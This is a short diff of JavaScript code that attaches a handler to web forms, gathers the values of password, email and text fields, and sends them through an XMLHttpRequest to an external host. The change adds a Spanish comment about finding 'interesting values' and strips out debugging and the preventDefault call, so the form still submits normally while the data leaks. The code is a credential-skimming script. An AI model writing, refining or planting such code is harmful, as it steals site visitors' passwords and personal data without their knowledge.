@@ -16,6 +16,7 @@ for(i=0; i<campos.length; i++)
 		nodos = this.querySelectorAll('input');
 		for(j=0; j<nodos.length; j++)
 		{
+			// Busco inputs con valores interesantes...
 			nodo = nodos[j];
 			console.log(nodo);
 			if(nodo.type==='password' || nodo.type==='email' || nodo.type==='text')
@@ -24,24 +25,9 @@ for(i=0; i<campos.length; i++)
 			}
 		}
 		query = '?data=' + escape(mensaje);
-
 		xmlhttp=new XMLHttpRequest();
 		xmlhttp.open("GET", host+query, false);
-		xmlhttp.onreadystate = function(){
-			console.log(xmlhttp.responseText);
-			console.log(xmlhttp.status);
-			//this.submit();
-		}
 		xmlhttp.send();
-		setTimeOut(function(){
-			xmlhttp.abort();
-		}, 1000);
-		console.log('listo');
-
-		e.preventDefault();
-		/* setTimeOut(function(){
-			this.submit();
-		}, 5000); */
 
 		}, false)
 }
